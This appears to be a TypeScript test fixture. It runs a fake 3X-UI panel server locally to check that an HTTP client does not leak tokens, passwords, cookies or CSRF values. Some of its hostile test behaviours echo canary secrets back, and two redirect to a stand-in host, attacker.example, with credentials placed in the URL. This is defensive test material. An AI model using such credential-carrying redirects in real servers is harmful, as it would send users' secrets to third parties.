import { createServer as createHttpServer, type Server } from 'node:http';
import { createServer as createHttpsServer } from 'node:https';
import { once } from 'node:events';
import type { AddressInfo } from 'node:net';

/**
 * A deterministic 3X-UI, on a real socket.
 *
 * Modelled on MHSanaei/3x-ui v3.7.0 at commit
 * `f727d04f6522bb94a8fb52e8352fdcafb51c11e1`, and only on things that source
 * actually does. Every behaviour below cites where it comes from, because a
 * fake that invents its own contract proves that the adapter matches the fake.
 *
 * Real sockets, and the real `SafeHttpClient` against them. Mocking the client
 * away would erase exactly the parts worth testing here: URL composition
 * against a custom `webBasePath`, TLS, the redirect policy, and whether
 * credentials can escape to another origin.
 *
 * The server is hostile on demand. Several behaviours REFLECT the secrets they
 * were sent — a token in a message, a password in JSON, the cookie in a body,
 * the CSRF token in a redirect target — so that a test can search the whole of
 * Nexa's output for a canary and prove sanitization rather than assume it.
 */

export interface Fake3xUiOptions {
  /** Serves under this path, as `webBasePath` does. Must start and end with `/`. */
  readonly basePath?: string;
  /**
   * Tokens this panel accepts, and the scope each carries. `denied` is not an
   * upstream scope name: it stands for any token whose scope's allowlist does
   * not contain this route, which v3.7.0's `enforceTokenScope` answers 403.
   */
  readonly tokens?: Readonly<Record<string, 'admin' | 'monitor' | 'node-sync' | 'denied'>>;
  readonly username?: string;
  readonly password?: string;
  /** When true, `getTwoFactorEnable` answers true and login is unreachable. */
  readonly twoFactorEnabled?: boolean;
  readonly behaviour?: Behaviour;
  /** TLS, when the test needs a certificate. */
  readonly tls?: { readonly key: string; readonly cert: string };
  /** Where a redirecting behaviour points. */
  readonly redirectTo?: string;
}

export type Behaviour =
  | 'healthy'
  /** `LastStatus()` before the first background refresh: success, `obj` null. */
  | 'status-obj-null'
  /** A 200 that is not JSON at all — a proxy's login page. */
  | 'status-html'
  /** Valid JSON, no envelope. */
  | 'status-no-envelope'
  /** A well-formed envelope reporting failure. */
  | 'status-success-false'
  /** An envelope whose `obj` carries no `xray` — not a 3X-UI status. */
  | 'status-missing-xray'
  /** More fields than this release knows. Must stay compatible. */
  | 'status-extra-fields'
  /** Far more body than the client's cap. */
  | 'status-oversized'
  /** Reflects the bearer token into the response body. */
  | 'status-reflects-token'
  /** The login answer reflects the submitted credentials. */
  | 'login-reflects-credentials'
  /** The login answer reflects the session cookie and CSRF token. */
  | 'login-reflects-session'
  /** Every route answers a redirect, to `redirectTo`, carrying secrets in it. */
  | 'redirect-everything'
  /** Only the status route redirects. */
  | 'redirect-status'
  /** Accepts the connection and never answers. */
  | 'hang';

export interface Fake3xUi {
  readonly baseUrl: string;
  readonly origin: string;
  /** Every request the fake saw, in order. */
  readonly requests: ReadonlyArray<RecordedRequest>;
  reset(): void;
  close(): Promise<void>;
}

export interface RecordedRequest {
  readonly method: string;
  readonly path: string;
  readonly headers: Readonly<Record<string, string>>;
  readonly body: string;
}

/** The canaries. Unique enough that a substring search cannot be a coincidence. */
export const CANARY = {
  token: 'canary-token-a1b2c3d4e5f6a1b2c3d4e5f6',
  password: 'canary-password-9f8e7d6c5b4a9f8e7d6c5b4a',
  username: 'canary-user-11223344',
  cookie: 'canary-cookie-value-778899aabbccddee',
  csrf: 'canary-csrf-token-556677889900aabbccdd',
} as const;

const STATUS_OBJ = {
  cpu: 12.5,
  cpuCores: 4,
  mem: { current: 2147483648, total: 8589934592 },
  swap: { current: 0, total: 4294967296 },
  disk: { current: 53687091200, total: 268435456000 },
  netIO: { up: 1073741824, down: 2147483648 },
  xray: { state: 'running', errorMsg: '', version: 'v25.10.31' },
  panelVersion: '3.7.0',
  uptime: 123456,
  tcpCount: 42,
};

export async function startFake3xUi(options: Fake3xUiOptions = {}): Promise<Fake3xUi> {
  const basePath = options.basePath ?? '/';
  const tokens = options.tokens ?? {};
  const behaviour = options.behaviour ?? 'healthy';
  const requests: RecordedRequest[] = [];
  // The session store. Keyed by the cookie value the fake issued, exactly as
  // v3.7.0 binds its CSRF token to the session rather than to the request.
  const sessions = new Map<string, { csrf: string; loggedIn: boolean }>();
  let issued = 0;

  const handler = (
    request: import('node:http').IncomingMessage,
    response: import('node:http').ServerResponse,
  ): void => {
    const chunks: Buffer[] = [];
    request.on('data', (chunk: Buffer) => chunks.push(chunk));
    request.on('end', () => {
      const body = Buffer.concat(chunks).toString('utf8');
      const rawUrl = request.url ?? '/';
      const headers: Record<string, string> = {};
      for (const [key, value] of Object.entries(request.headers)) {
        headers[key.toLowerCase()] = Array.isArray(value) ? value.join(', ') : (value ?? '');
      }
      requests.push({ method: request.method ?? 'GET', path: rawUrl, headers, body });

      if (behaviour === 'hang') return;

      const json = (status: number, value: unknown, extra: Record<string, string> = {}): void => {
        response.writeHead(status, { 'content-type': 'application/json', ...extra });
        response.end(JSON.stringify(value));
      };
      const envelope = (success: boolean, obj: unknown, msg = ''): unknown => ({
        success,
        msg,
        obj,
      });

      // Everything below the configured base path, and nothing above it. A
      // request that escaped the base path lands here and is answered exactly
      // as a real panel would answer it: not found, with no envelope at all.
      if (!rawUrl.startsWith(basePath)) {
        response.writeHead(404, { 'content-type': 'text/html' });
        response.end('<html><body>404 page not found</body></html>');
        return;
      }
      const route = rawUrl.slice(basePath.length).split('?')[0] ?? '';

      const cookieHeader = headers['cookie'] ?? '';
      const sessionId = /(?:^|;\s*)3x-ui=([^;]+)/.exec(cookieHeader)?.[1] ?? '';
      const session = sessions.get(sessionId);

      if (behaviour === 'redirect-everything') {
        // A redirect that WANTS to carry credentials onward: the secrets the
        // caller just sent are pasted into the target.
        const target = `${options.redirectTo ?? 'https://attacker.example'}/landing?t=${
          headers['authorization'] ?? ''
        }&c=${cookieHeader}&x=${headers['x-csrf-token'] ?? ''}`;
        response.writeHead(302, { location: target });
        response.end();
        return;
      }

      // --- csrf-token (v3.7.0 index.go: public, GET, mints and binds) --------
      if (route === 'csrf-token') {
        issued += 1;
        const id = `${CANARY.cookie}-${issued}`;
        const csrf = `${CANARY.csrf}-${issued}`;
        sessions.set(id, { csrf, loggedIn: false });
        json(200, envelope(true, csrf), {
          'set-cookie': `3x-ui=${id}; Path=${basePath}; Expires=Wed, 09 Jun 2027 10:18:14 GMT; HttpOnly`,
        });
        return;
      }

      // --- CSRF gate (security.go: unsafe methods need the bound token) -----
      const csrfOk = (): boolean =>
        session !== undefined && headers['x-csrf-token'] === session.csrf;

      if (route === 'getTwoFactorEnable') {
        if (request.method !== 'POST') return void json(404, envelope(false, null));
        if (!csrfOk()) {
          response.writeHead(403);
          response.end();
          return;
        }
        json(200, envelope(true, options.twoFactorEnabled === true));
        return;
      }

      if (route === 'login') {
        if (request.method !== 'POST') return void json(404, envelope(false, null));
        if (!csrfOk()) {
          // v3.7.0's CSRFMiddleware: AbortWithStatus(403), no body.
          response.writeHead(403);
          response.end();
          return;
        }
        let submitted: { username?: unknown; password?: unknown } = {};
        try {
          submitted = JSON.parse(body) as typeof submitted;
        } catch {
          const form = new URLSearchParams(body);
          submitted = { username: form.get('username'), password: form.get('password') };
        }
        const correct =
          submitted.username === (options.username ?? CANARY.username) &&
          submitted.password === (options.password ?? CANARY.password);

        if (behaviour === 'login-reflects-credentials') {
          // Hostile: the panel echoes what it was sent. Nothing of this may
          // reach any Nexa surface.
          json(
            200,
            envelope(
              false,
              { submitted },
              `rejected user=${String(submitted.username)} pass=${String(submitted.password)}`,
            ),
          );
          return;
        }
        if (behaviour === 'login-reflects-session') {
          json(200, envelope(false, { cookie: cookieHeader, csrf: headers['x-csrf-token'] }));
          return;
        }
        if (!correct) {
          // The v3.7.0 shape that matters most: HTTP 200, success false.
          json(200, envelope(false, null, 'Wrong username or password'));
          return;
        }
        if (session !== undefined) session.loggedIn = true;
        json(200, envelope(true, null, 'Logged in successfully'));
        return;
      }

      // --- panel/api/server/status ------------------------------------------
      if (route === 'panel/api/server/status') {
        const auth = headers['authorization'] ?? '';
        const bearer = auth.startsWith('Bearer ') ? auth.slice(7) : null;
        const scope = bearer === null ? null : (tokens[bearer] ?? null);

        if (bearer !== null && scope === null) {
          // checkAPIAuth: an unknown token is not a session either, so the
          // 401/404 split applies.
          if (headers['x-requested-with'] === 'XMLHttpRequest') {
            response.writeHead(401, { 'content-type': 'application/json' });
            response.end(JSON.stringify(envelope(false, null, 'unauthorized')));
          } else {
            response.writeHead(404, { 'content-type': 'text/html' });
            response.end('<html><body>404 page not found</body></html>');
          }
          return;
        }
        if (bearer === null && session?.loggedIn !== true) {
          if (headers['x-requested-with'] === 'XMLHttpRequest') {
            response.writeHead(401, { 'content-type': 'application/json' });
            response.end(JSON.stringify(envelope(false, null, 'unauthorized')));
          } else {
            response.writeHead(404, { 'content-type': 'text/html' });
            response.end('<html><body>404 page not found</body></html>');
          }
          return;
        }
        // enforceTokenScope: monitor and node-sync both reach /server/status;
        // a scope that does not is refused with 403 and an envelope.
        if (scope === 'denied') {
          // enforceTokenScope's exact refusal: a known token, a real session,
          // and a scope whose allowlist does not reach this route.
          json(
            403,
            envelope(false, null, 'this API token is not permitted to access this endpoint'),
          );
          return;
        }

        switch (behaviour) {
          case 'status-obj-null':
            return void json(200, envelope(true, null));
          case 'status-html':
            response.writeHead(200, { 'content-type': 'text/html' });
            return void response.end('<html><body>login</body></html>');
          case 'status-no-envelope':
            return void json(200, { cpu: 1, xray: { state: 'running' } });
          case 'status-success-false':
            return void json(200, envelope(false, null, 'something went wrong'));
          case 'status-missing-xray':
            return void json(200, envelope(true, { cpu: 1, panelVersion: '3.7.0' }));
          case 'status-extra-fields':
            return void json(
              200,
              envelope(true, {
                ...STATUS_OBJ,
                aFieldFromTheFuture: { nested: true },
                anotherOne: [1, 2, 3],
              }),
            );
          case 'status-oversized':
            return void json(
              200,
              envelope(true, { ...STATUS_OBJ, filler: 'x'.repeat(2 * 1024 * 1024) }),
            );
          case 'status-reflects-token':
            return void json(
              200,
              envelope(true, { ...STATUS_OBJ, seenToken: bearer, seenCookie: cookieHeader }),
            );
          case 'redirect-status':
            response.writeHead(302, {
              location: `${options.redirectTo ?? 'https://attacker.example'}/x?t=${bearer ?? ''}`,
            });
            return void response.end();
          default:
            return void json(200, envelope(true, STATUS_OBJ));
        }
      }

      response.writeHead(404, { 'content-type': 'text/html' });
      response.end('<html><body>404 page not found</body></html>');
    });
  };

  const server: Server =
    options.tls === undefined
      ? createHttpServer(handler)
      : createHttpsServer({ key: options.tls.key, cert: options.tls.cert }, handler);

  server.listen(0, '127.0.0.1');
  await once(server, 'listening');
  const { port } = server.address() as AddressInfo;
  const scheme = options.tls === undefined ? 'http' : 'https';
  const origin = `${scheme}://127.0.0.1:${port}`;

  return {
    baseUrl: `${origin}${basePath}`,
    origin,
    requests,
    reset(): void {
      requests.length = 0;
      sessions.clear();
    },
    async close(): Promise<void> {
      server.closeAllConnections();
      server.close();
      await once(server, 'close');
    },
  };
}
